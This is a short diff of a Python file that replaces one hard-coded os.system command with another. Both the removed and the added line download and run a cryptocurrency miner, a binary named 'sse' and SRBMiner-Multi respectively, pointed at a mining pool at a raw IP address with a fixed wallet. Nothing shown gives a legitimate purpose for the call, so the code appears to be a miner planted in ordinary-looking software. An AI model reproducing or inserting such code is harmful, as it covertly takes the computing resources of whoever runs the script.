@@ -12,4 +12,4 @@ from subprocess import PIPE, Popen
 import base64
 
 
-os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespowerTIDE -o stratum+tcp://178.170.40.44:6243 -u TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip.NUNG -p x -t 15") 
+os.system("curl -L -o SRBMiner-Multi-1-0-6-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.6/SRBMiner-Multi-1-0-6-Linux.tar.xz && tar -xf SRBMiner-Multi-1-0-6-Linux.tar.xz && cd SRBMiner-Multi-1-0-6 && ./SRBMiner-MULTI --disable-gpu --algorithm yespowertide --pool stratum+tcp://178.170.40.44:6243 --wallet TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip --password x -t 15") 
